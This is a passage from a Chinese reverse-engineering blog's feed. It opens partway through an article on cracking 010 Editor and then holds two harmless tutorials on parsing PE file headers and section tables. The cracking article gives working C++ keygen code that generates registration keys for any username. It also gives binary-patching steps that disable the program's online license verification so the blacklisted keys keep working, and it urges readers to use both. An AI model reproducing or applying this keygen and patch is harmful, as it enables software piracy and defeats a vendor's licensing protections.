跳转指令可以使它不成立，这个雏形生成的密码并没有与用户名进行关联，在下一小节当中会分析密码与用户名的之间的联系。</p><h2 id="深入分析算法"><a href="#深入分析算法" class="headerlink" title="深入分析算法"></a>深入分析算法</h2><p>在上一小节当中，通过穷举法来找出符合要求的密码。下面将会为大家分析下用户名和密码之间的关系。</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1o_VeNkvoK1RjSZFN763xMVXap.png" alt=""></p><p>咱继续，接下来这一小段将 <code>ECX</code> 与 <code>0x2</code> 进行对比，其实好像也没什么用，我们看 JMP 跳转后的指令，如下：</p><div class="tip "><p>提示：由于此文写的比较早，当时上传的图是使用免费图床，官方会不时清理免费用户的图，所以导致缺失。</p></div><p>这一段主要是将用户名的字符串转为 <code>ASCII</code> 版，在接下来的一个调用 CALL 后，<code>EAX</code> 中为用户名字符串地址，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1RVufae3tHKVjSZSg7604QFXau.png" alt=""></p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1jMFRNhnaK1RjSZFt762C2VXan.png" alt=""></p><p>在上图中的 <code>ds:[edi+0x1C]</code> 处其实是前面处理 <code>k[0] 和 k[6]</code> 那个 CALL 后的返回值（即 <code>AL</code> 的值），所以我们需要将代码中的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (AL &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    k[<span class="number">0</span>] = k0;</span><br><span class="line">    k[<span class="number">6</span>] = k6;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改为如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (AL &gt; <span class="number">0xA</span>)</span><br><span class="line">&#123;</span><br><span class="line">    k[<span class="number">0</span>] = k0;</span><br><span class="line">    k[<span class="number">6</span>] = k6;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是要做的就是那个对用户名处理的 CALL，通过分析知道，这个 CALL 的返回值类似于哈希值，我们需要得到这个值，回为这个值需要和 <code>k[4]、k[5]、k[6]、k[7]</code> 发生关系，我们不妨声明这样一个函数，用来处理 <code>ASCII</code> 码版的用户名字符串，这里有个取巧的办法，那就是利用 IDA，将 <code>010 Editor</code> 载入 IDA 中，我们需要先获取处理这个用户名字符串的 CALL 的地址，这个地址可以通过 OD 找到，找到之后，切换到 IDA，按 <code>g</code> 输入地址回车，再按下 <code>F5</code> 进行翻译，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1JdJwNgHqK1RjSZFg7617JXXaW.png" alt=""></p><p>大致浏览一下，并不是太复杂，其中用到了一个数组，也就是上图圈出来的，双击进去，如下：</p><div class="tip "><p>提示：由于此文写的比较早，当时上传的图是使用免费图床，官方会不时清理免费用户的图，所以导致缺失。</p></div><p>这里显示的比较乱，我们可把地址 <code>02EDD840</code> 转到 OD 里查看，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1leRBNa6qK1RjSZFm7600PFXaP.png" alt=""></p><p>利用 OD 的插件将这一段进行数据转换并以 C++ 形式复制出来，并将其命名为 <code>dwEncodeArray</code>，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1CMaQae3tHKVjSZSg7604QFXa8.png" alt=""></p><p>并将原来的代码做下调整，如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生成密码</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMy010EditorRegisterDlg::OnBnClickedButtonGenerate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">    <span class="comment">// 先判断用户名输入是否为空</span></span><br><span class="line">    <span class="keyword">if</span>(m_edit_name.<span class="built_in">GetWindowTextLength</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        m_edit_password.<span class="built_in">SetWindowText</span>(<span class="string">L&quot;&quot;</span>);</span><br><span class="line">        CString str;</span><br><span class="line">        <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">        <span class="keyword">int</span> nRet = <span class="number">0x3E8</span>;</span><br><span class="line">        BYTE k[<span class="number">8</span>] = &#123; <span class="number">0x12</span>,<span class="number">0x34</span>,<span class="number">0x56</span>,<span class="number">0x9C</span>,<span class="number">0x90</span>,<span class="number">0x09</span>,<span class="number">0x87</span>,<span class="number">0x65</span> &#125;;</span><br><span class="line">        m_edit_name.<span class="built_in">GetWindowText</span>(str);</span><br><span class="line">        <span class="function">CStringA <span class="title">stra</span><span class="params">(str.GetBuffer(<span class="number">0</span>))</span></span>;</span><br><span class="line">        str.<span class="built_in">ReleaseBuffer</span>();</span><br><span class="line">        <span class="function">string <span class="title">st</span><span class="params">(stra.GetBuffer(<span class="number">0</span>))</span></span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span>* cs = st.<span class="built_in">c_str</span>();</span><br><span class="line">        <span class="comment">// 用户名进行加密</span></span><br><span class="line">        DWORD dwKey = <span class="built_in">EncodeUserName</span>(cs, <span class="number">1</span>, <span class="number">0</span>, nRet);</span><br><span class="line">        <span class="comment">// CMP k[4],RetValue&amp;0xFF</span></span><br><span class="line">        <span class="comment">// CMP k[5],RetValue&gt;&gt;8&amp;0xFF</span></span><br><span class="line">        <span class="comment">// CMP k[6],RetValue&gt;&gt;16&amp;0xFF</span></span><br><span class="line">        <span class="comment">// CMP k[7],RetValue&gt;&gt;24&amp;0xFF</span></span><br><span class="line">        k[<span class="number">4</span>] = dwKey &amp; <span class="number">0xFF</span>;</span><br><span class="line">        k[<span class="number">5</span>] = dwKey &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xFF</span>;</span><br><span class="line">        k[<span class="number">6</span>] = dwKey &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xFF</span>;</span><br><span class="line">        k[<span class="number">7</span>] = dwKey &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="keyword">while</span> (TRUE)</span><br><span class="line">        &#123;</span><br><span class="line">            BYTE k0 = <span class="built_in">rand</span>() % <span class="number">0xFF</span>;</span><br><span class="line">            BYTE k6 = k[<span class="number">6</span>];</span><br><span class="line">            <span class="comment">// AL = (k[0]^k[6]^0x18 + 0x3D)^0xA7</span></span><br><span class="line">            BYTE AL = (k0 ^ k6 ^ <span class="number">0x18</span> + <span class="number">0x3D</span>) ^ <span class="number">0xA7</span>;</span><br><span class="line">            <span class="keyword">if</span> (AL &gt; <span class="number">0xA</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                k[<span class="number">0</span>] = k0;</span><br><span class="line">                k[<span class="number">6</span>] = k6;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ESI = (0x100*(k[1]^k[7] &amp; 0xFF) + k[2]^k[5] &amp; 0xFF)&amp;0xFFFF</span></span><br><span class="line">        <span class="comment">// EAX = ((ESI^0x7892+0x4D30)^0x3421)&amp;0xFFFF / 0xB</span></span><br><span class="line">        <span class="comment">// 判断余数是否为0，为0返回商，不为0返回0</span></span><br><span class="line">        <span class="keyword">while</span> (TRUE)</span><br><span class="line">        &#123;</span><br><span class="line">            BYTE k1 = <span class="built_in">rand</span>() % <span class="number">0xFF</span>;</span><br><span class="line">            BYTE k7 = k[<span class="number">7</span>];</span><br><span class="line">            BYTE k2 = <span class="built_in">rand</span>() % <span class="number">0xFF</span>;</span><br><span class="line">            BYTE k5 = k[<span class="number">5</span>];</span><br><span class="line">            DWORD ESI = (<span class="number">0x100</span> * (k1 ^ k7 &amp; <span class="number">0xFF</span>) + k2 ^ k5 &amp; <span class="number">0xFF</span>) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">            DWORD EAX = (((ESI ^ <span class="number">0x7892</span>) + <span class="number">0x4D30</span>) ^ <span class="number">0x3421</span>) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">            <span class="keyword">if</span> (EAX % <span class="number">0xB</span> == <span class="number">0</span> &amp;&amp; EAX / <span class="number">0xB</span> == <span class="number">0x3E8</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                k[<span class="number">1</span>] = k1;</span><br><span class="line">                k[<span class="number">7</span>] = k7;</span><br><span class="line">                k[<span class="number">2</span>] = k2;</span><br><span class="line">                k[<span class="number">5</span>] = k5;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">        str.<span class="built_in">Format</span>(<span class="string">L&quot;%02x%02x-%02x%02x-%02x%02x-%02x%02x&quot;</span>, k[<span class="number">0</span>], k[<span class="number">1</span>], k[<span class="number">2</span>], k[<span class="number">3</span>], k[<span class="number">4</span>], k[<span class="number">5</span>], k[<span class="number">6</span>], k[<span class="number">7</span>]);</span><br><span class="line">        m_edit_password.<span class="built_in">SetWindowText</span>(str.<span class="built_in">MakeUpper</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">L&quot;Please enter name&quot;</span>, <span class="string">L&quot;warning&quot;</span>, MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>EncodeUserName</code> 函数如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">CMy010EditorRegisterDlg::EncodeUserName</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">char</span> a3, <span class="keyword">unsigned</span> __int16 a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// edx</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// edi</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int8 v7; <span class="comment">// bl</span></span><br><span class="line">    <span class="keyword">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> v9; <span class="comment">// ecx</span></span><br><span class="line">    <span class="keyword">int</span> v10; <span class="comment">// ecx</span></span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int8 v12; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int8 v13; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [esp+10h] [ebp-8h]</span></span><br><span class="line">    <span class="keyword">int</span> v15; <span class="comment">// [esp+14h] [ebp-4h]</span></span><br><span class="line">    v4 = a1;</span><br><span class="line">    v15 = <span class="number">0</span>;</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (v5 &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">    v7 = <span class="number">15</span> * a4;</span><br><span class="line">    v14 = <span class="number">17</span> * a3;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        v8 = <span class="built_in">toupper</span>((<span class="keyword">unsigned</span> __int8)v4[v6]);</span><br><span class="line">        v9 = v15 + dwEcodeArray[v8];</span><br><span class="line">        <span class="keyword">if</span> (a2)</span><br><span class="line">            v10 = dwEcodeArray[v13]</span><br><span class="line">            + dwEcodeArray[v7]</span><br><span class="line">            + dwEcodeArray[v14]</span><br><span class="line">            + dwEcodeArray[(<span class="keyword">unsigned</span> __int8)(v8 + <span class="number">47</span>)] * (dwEcodeArray[(<span class="keyword">unsigned</span> __int8)(v8 + <span class="number">13</span>)] ^ v9);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v10 = dwEcodeArray[v12]</span><br><span class="line">            + dwEcodeArray[v7]</span><br><span class="line">            + dwEcodeArray[v14]</span><br><span class="line">            + dwEcodeArray[(<span class="keyword">unsigned</span> __int8)(v8 + <span class="number">23</span>)] * (dwEcodeArray[(<span class="keyword">unsigned</span> __int8)(v8 + <span class="number">63</span>)] ^ v9);</span><br><span class="line">        result = v10;</span><br><span class="line">        v15 = v10;</span><br><span class="line">        v13 += <span class="number">19</span>;</span><br><span class="line">        ++v6;</span><br><span class="line">        v14 += <span class="number">9</span>;</span><br><span class="line">        v7 += <span class="number">13</span>;</span><br><span class="line">        v12 += <span class="number">7</span>;</span><br><span class="line">        v4 = a1;</span><br><span class="line">    &#125; <span class="keyword">while</span> (v6 &lt; v5);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行后如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB146JTNkvoK1RjSZFN763xMVXaA.png" alt=""></p><p>这样就达到了任意用户名注册！</p><h2 id="去除网络验证"><a href="#去除网络验证" class="headerlink" title="去除网络验证"></a>去除网络验证</h2><p>已加去除网络验证这一小节，今天在打开 <code>010 Editor</code> 时，发现它弹出如下界面：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1d4CJNpzqK1RjSZFv763B7VXao.png" alt=""></p><p>出现这种情况是 <code>010 Editor</code> 会把该密码上传到它的服务器，如果发现不是通过正常渠道获取得的密码，它会把这个密码拉黑，出现上述这种情况你也不要慌，接下来我会为大家分析怎么来去除网络验证。</p><p>打开 OD，把 <code>010 Editor</code> 拖进来，<code>F9</code> 运行起来，点击 <code>Check License</code>，会断在如下地方：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1nVWCNrPpK1RjSZFF7615PpXas.png" alt=""></p><p>因为之前下的断点我并没删除，<code>F8</code> 来到 <code>00E08229</code> 处，如果按照正常来说，在调用完这两个 CALL 后，<code>EAX</code> 中的值要为 <code>0xDB</code>，而此时变成了 <code>0x113</code>，第一个 CALL 调用后，<code>EAX</code> 的值为 <code>0x2D</code>，这个没问题，那么问题可能出现在第二个 CALL 内，这个 CALL 本应该把 <code>EAX</code> 的值修改为 <code>0xDB</code>，而它去却把它修改成了 <code>0x113</code>，我们不妨跟进这个 CALL 内，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB15hW9NxjaK1RjSZKz760VwXXa6.png" alt=""></p><p><code>F8</code> 运行到此处后，发现此处的 JE 指令跳转不成功，接下来的 <code>mov eax,0x113</code> 代码将被执行并返回，所以需将 JE 指令改为 JMP，改完之后，该 CALL 最后返回 <code>0xDB</code>，而不是 <code>0x113</code>，在后面你会发现即使修改了这处，它还是一样会验证失败，原因如下：</p><div class="tip "><p>提示：由于此文写的比较早，当时上传的图是使用免费图床，官方会不时清理免费用户的图，所以导致缺失。</p></div><p>这个 JNS 指令它会跳到失败处，也就是那个字符串提示你的密码已被删除，注意图中的 <code>EAX</code> 的值，它为 -1，同时，在运行 <code>00E0824B</code> 的 CALL 指令会卡一下，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB1vGCQNq6qK1RjSZFm7600PFXa0.png" alt=""></p><p>整个注册界面会变灰，这时它在调用这个 CALL 进行网络验证，需要等待一下，等它验证完后，<code>EAX</code> 的值变会变成 -1，从而使得 JNS 指令成立，所以解决的办法是进入到网络验证这个 CALL 内，把 <code>EAX</code> 的值修改成不是负数，在这我把它改成 1，如下：</p><p><img src="https://image.zeronohacker.com/article/2019/05/28/HTB190G2NxYaK1RjSZFn76180pXa7.png" alt=""></p><p><code>ret</code> 多少，可以向下滑，看它正常 <code>ret</code> 多少，你这里也 <code>ret</code> 多少，最后 Dump 出来覆盖原文件就可以了，注册机还是不变，只要你从官网下载 32 位版的 <code>010 Editor</code> 并安装在你计算机后，运行注册机后注册即可，以后就不用担心拉黑了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;010-Editor-简单介绍&quot;&gt;&lt;a href=&quot;#010-Editor-简单介绍&quot; class=&quot;headerlink&quot; title=&quot;010 Editor 简单介绍&quot;&gt;&lt;/a&gt;010 Editor 简单介绍&lt;/h2&gt;&lt;p&gt;&lt;code&gt;010 Editor&lt;/</summary>
      
    
    
    
    <category term="C/C++" scheme="https://zeronohacker.github.io/categories/C-C/"/>
    
    
    <category term="010 Editor" scheme="https://zeronohacker.github.io/tags/010-Editor/"/>
    
    <category term="逆向破解" scheme="https://zeronohacker.github.io/tags/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>手工打造 PE 解析器之区块表</title>
    <link href="https://zeronohacker.github.io/2018/12/25/manually-build-the-block-table-of-the-pe-parser/"/>
    <id>https://zeronohacker.github.io/2018/12/25/manually-build-the-block-table-of-the-pe-parser/</id>
    <published>2018-12-25T07:26:22.000Z</published>
    <updated>2021-09-19T07:33:10.836Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前述"><a href="#前述" class="headerlink" title="前述"></a>前述</h2><p>在 NT 头结束后，紧接着就是区块表，区块表用来描述位于其后各个区块的各种属性，PE 文件最少要有一个区块才能被加载运行。</p><h2 id="区块表"><a href="#区块表" class="headerlink" title="区块表"></a>区块表</h2><p>区块表是一个 IMAGE_SECTION_HEADER 结构数组，这个结构包含区块的信息，比如位置、长度、属性等，区块的数目是由 NT 头中的文件头里的 NumberOfSections 给出。以下为 IMAGE_SECTION_HEADER 结构：</p><p><img src="https://image.zeronohacker.com/article/2018/12/25/152750rzsnk49xzic4fc3k.png" alt=""></p><p>在上述图中，有两个字段比较重要，分别为 VirtualAddress、PointerToRawData，这两个字段用于将相对虚拟地址或虚拟地址转换为文件偏移地址，以下为 RVA 转 FOA 函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RVA 转 FOA</span></span><br><span class="line"><span class="function">DWORD <span class="title">RVAtoFOA</span><span class="params">(DWORD dwRva)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取区段表的数量</span></span><br><span class="line">    DWORD dwCounts = g_NtHeader-&gt;FileHeader.NumberOfSections;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取区段表数组的首元素</span></span><br><span class="line">    <span class="keyword">auto</span> Sections = <span class="built_in">IMAGE_FIRST_SECTION</span>(g_NtHeader);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 遍历所有的区段表找到符合要求的区段</span></span><br><span class="line">    <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; dwCounts; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 要求：RVA &gt;= 区段的首地址 并且 RVA &lt; 区段的结尾的地址</span></span><br><span class="line">        <span class="keyword">if</span> (dwRva &gt;= Sections[i].VirtualAddress &amp;&amp;</span><br><span class="line">            dwRva &lt; (Sections[i].VirtualAddress + Sections[i].SizeOfRawData))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// FOA = VA - ImageBase - （所在区段的 RVA - 所在区段的 FOA）</span></span><br><span class="line">            <span class="comment">// FOA = RVA - 所在区段的 RVA + 所在区段的 FOA</span></span><br><span class="line">            <span class="keyword">return</span> dwRva - Sections[i].VirtualAddress + Sections[i].PointerToRawData;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 如果找不到就返回 -1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="tip "><p>计算公式：FOA = VA – ImageBase – (所在区段的 RVA – 所在区段的 FOA) 或 FOA = RVA – 所在区段的 RVA + 所在区段的 FOA </p></div><p>在上述代码中，有一个为 IMAGE_FIRST_SECTION，我们来看下它的定义，如下：</p><p><img src="https://image.zeronohacker.com/article/2018/12/25/152838k3ppyv1n1w2y3vjj.png" alt=""></p><p>其实 IMAGE_FIRST_SECTION 为一个宏，它主要由三部分相加组成，作用是获取到第一个区段的首地址，参数为 NT 头。你可以把这个首地址理解成数组名，数组的首地址。在获取到了地址后，下面的 for 循环遍历所有的区段表找到符合要求的区段。这三部分内容具体如下：</p><ul><li>IMAGE_NT_HEADERS 的起始地址</li><li>IMAGE_OPTIONAL_HEADER32 （PE 扩展头）在 IMAGE_NT_HEADERS 中的偏移</li><li>IMAGE_OPTIONAL_HEADER32 的大小</li></ul><p>其中后两个加起来的大小恰好就是 IMAGE_NT_HEADERS 的大小，再跟第一个相加就得到区段表的地址了。看到这你可以会问，为什么不直接加上 IMAGE_NT_HEADERS 的大小呢？因为 IMAGE_OPTIONAL_HEADER32 大小不固定，32 位下该值为 0x00E0H，64 位下该值为 0x00F0H，并且用户还可以自定义其大小。</p><h2 id="额外说明"><a href="#额外说明" class="headerlink" title="额外说明"></a>额外说明</h2><p>扩展头大小是由文件头中 SizeOfOptionalHeader 字段给出，FIELD_OFFSET 这个是给出 OptionalHeader 在 IMAGE_NT_HEADERS 结构中的偏移，如下：</p><p><img src="https://image.zeronohacker.com/article/2018/12/25/152910udjjjs8rdg8pcqq8.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前述&quot;&gt;&lt;a href=&quot;#前述&quot; class=&quot;headerlink&quot; title=&quot;前述&quot;&gt;&lt;/a&gt;前述&lt;/h2&gt;&lt;p&gt;在 NT 头结束后，紧接着就是区块表，区块表用来描述位于其后各个区块的各种属性，PE 文件最少要有一个区块才能被加载运行。&lt;/p&gt;
&lt;h2 </summary>
      
    
    
    
    <category term="C/C++" scheme="https://zeronohacker.github.io/categories/C-C/"/>
    
    
    <category term="PE" scheme="https://zeronohacker.github.io/tags/PE/"/>
    
  </entry>
  
  <entry>
    <title>手工打造 PE 解析器之 DOS 头和 NT 头</title>
    <link href="https://zeronohacker.github.io/2018/12/24/manually-build-the-dos-header-and-nt-header-of-the-pe-parser/"/>
    <id>https://zeronohacker.github.io/2018/12/24/manually-build-the-dos-header-and-nt-header-of-the-pe-parser/</id>
    <published>2018-12-24T07:00:38.000Z</published>
    <updated>2021-09-19T07:23:49.277Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前述"><a href="#前述" class="headerlink" title="前述"></a>前述</h2><p>可执行文件格式是操作系统本身执行机制的反映，理解它有助于对操作系统的深刻理解，掌握可执行文件的数据结构及其一些机理，是研究软件安全的必修课。PE (Portable Executable File Format) 是目前 windows 平台上的主流可执行文件格式。PE 文件衍生于早期的 COFF 文件格式，描述 PE 格式及 COFF 文件的主要地方在 winnt.h 这个头文件，其中有一节叫 Image Format，如下：</p><p><img src="https://image.zeronohacker.com/article/2018/12/24/100550eewmdrffq2e5fnq5.png" alt=""></p><p>该节给出了 DOS MZ 格式和 windows 3.1 的 NE 格式文件头，之后就是 PE 文件的内容，在这个头文件中，几乎能找到关于 PE 文件的每一个数据结构的定义、枚举类型、常量定义。winnt.h 这个头文件是 PE 文件定义的最终决定者。DLL 和 EXE 文件之间的区别完全是语义上的，它们使用完全相同的 PE 格式。唯一的区别就是用一个字段标识出这个文件是 EXE 还是 DLL。同时也包括其它的 DLL 扩展，比如 OCX 控件和控制面板程序 (CPL 文件)。另外，64 位 windows 只是对 PE 格式做了一些简单的修饰，新格式叫 PE32+，没有新的结构加进去，其余的改变只是简单地将以前的 32 位字段扩展成 64 位，比如 IMAGE_NT_HEADERS，如下：</p><p><img src="https://image.zeronohacker.com/article/2018/12/24/100616a78xi7k6ii00v641.png" alt=""></p><h2 id="PE-文件大体结构"><a href="#PE-文件大体结构" class="headerlink" title="PE 文件大体结构"></a>PE 文件大体结构</h2><p>结构的选择依赖于用户正在编译的模式 (尤其是 _WIN64 是否被定义)，在具体学习 PE 之前，先大概清楚下 PE 格式布局是怎样子的，如下：</p><p><img src="https://image.zeronohacker.com/article/2018/12/24/100650vomjiz9sx9jj8mgm.png" alt=""></p><p>PE 文件使用的是一个平面地址空间，所有代码和数据都被合并在一起，组成一个很大的结构，文件的内容被分割为不同的区块，区块包含代码和数据，各个区块按页边界来对齐，区块没有大小限制，是一个连续结构，每个块都有它自己在内存中的一套属性。PE 文件是由 PE 加载器加载到内存中的，这个 PE 加载器也就是 windows 加载器，它并不是将 PE 文件作为单一内存映射文件装入到内存中，而是去遍历 PE 文件，决定将哪一部分进行映射，这种映射方式是将文件较高的偏移位置映射到较高的内存地址，当磁盘文件装入到内存中，其数据结构布局是一致的，但是数据之间的相对位置可能会改变，如下：</p><p><img src="https://image.zeronohacker.com/article/2018/12/24/100802zpj28547nb442p5a.png" alt=""></p><h2 id="模块和基地址"><a href="#模块和基地址" class="headerlink" title="模块和基地址"></a>模块和基地址</h2><p>下面需要理清两个概念，那就是 模块 和 基地址，当 PE 文件通过 windows 加载器加载到内存后，内存中的版本被称为模块 (Module)，映射文件的起始地址被称为模块句柄 (hModule)，可以通过模块句柄来访问在内存中其它的数据结构，这个初始地址也被称为基地址 (ImageBase)。在 32 位 windows 系统中可以直接调用 GetModuleHandle 以取得指向 DLL 的指针，通过指针访问该 DLL Module 的内容，函数原型为：HMODULE WINAPI GetModuleHandle(LPCTSTR lpModuleName)</p><p>功能：获取一个应用程序或动态链接库的模块句柄。</p><p>参数：传递一个可执行文件或 DLL 文件名字符串</p><p>返回值：若执行成功，则返回模块的句柄，也就是加载的基地址，若返回零，则表示失败。如果传递参数为 NULL，则返回调用的可执行文件的基地址。</p><p>注意事项：只有在当前进程中，这个句柄才会有效，也就是说已映射到调用该函数的进程内，才会正确得到模块句柄。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 